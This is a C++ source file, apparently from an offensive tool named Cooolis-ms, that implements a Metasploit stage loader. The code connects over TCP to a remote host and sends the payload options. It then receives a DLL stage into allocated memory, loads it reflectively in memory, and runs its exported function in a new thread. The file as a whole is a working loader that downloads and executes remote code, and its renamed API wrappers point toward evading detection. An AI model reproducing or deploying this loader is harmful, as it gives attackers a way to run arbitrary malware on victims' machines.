#include "Cooolis-msf.h"

CCooolisMetasploit::CCooolisMetasploit()
{
	// 初始化
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	this->getStager = new stager;  // 发送数据结构体
	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		// 
	}

}

CCooolisMetasploit::~CCooolisMetasploit()
{
	delete this->getStager;
	
}

BOOL CCooolisMetasploit::SendPayload(std::string options, std::string payload)
{
	
	ZeroMemory(getStager->payload, PAYLOAD_LEN); // 清空内存
	ZeroMemory(getStager->options, PAYLOAD_LEN); // 清空内存
	CopyMemory(getStager->options, options.c_str(), options.length());
	CopyMemory(getStager->payload, payload.c_str(), payload.length());

	// 发送数据
	return send(socks, (char*)getStager, PAYLOAD_LEN*2, 0);
}

BOOL CCooolisMetasploit::RecvStage()
{
	DWORD dwStageLength = 0;
	// 接收Stage长度
	recv(socks, (char*)&dwStageLength, sizeof(DWORD), 0);
	
	// 等待三秒执行
	// Sleep(3000);
	this->pSpace = (CHAR*)CooolisVirtualAlloc(NULL, dwStageLength, MEM_COMMIT, PAGE_READWRITE);

	// 将Stage放入内存页
	if (recv(socks, pSpace, dwStageLength, 0) == SOCKET_ERROR) {
		return FALSE;
	}
	/*
	if (this->socks)
		closesocket(this->socks);
	*/

	return TRUE;
}

BOOL CCooolisMetasploit::ConnectServer(std::string host, USHORT port)
{
	struct sockaddr_in sock_addr; // 套接字属性
	InetPtonA(AF_INET, host.c_str(), &(sock_addr.sin_addr)); // 转换IP地址
	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sock_addr.sin_family = AF_INET;		// 套接字类型
	sock_addr.sin_port = htons(port);  // 套接字端口
	// 连接服务器
	if (connect(socks, (struct sockaddr*) & sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
		return FALSE;
	}
	return TRUE;
}

VOID CCooolisMetasploit::GoodCooolis()
{
	DWORD dwThread = 0;
	CHAR cFunctionName[] = { 'D','l','l','M','a','n','\0' };
	HMEMORYMODULE hModule;
	Module DllMain;
	// 导入PE文件
	hModule = MemoryLoadLibrary(pSpace);
	// hModule = MemoryLoadLibrary(NULL);
	DllMain = (Module)MemoryGetProcAddress(hModule, cFunctionName);

	hThread = CooolisCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);

	return VOID();
}
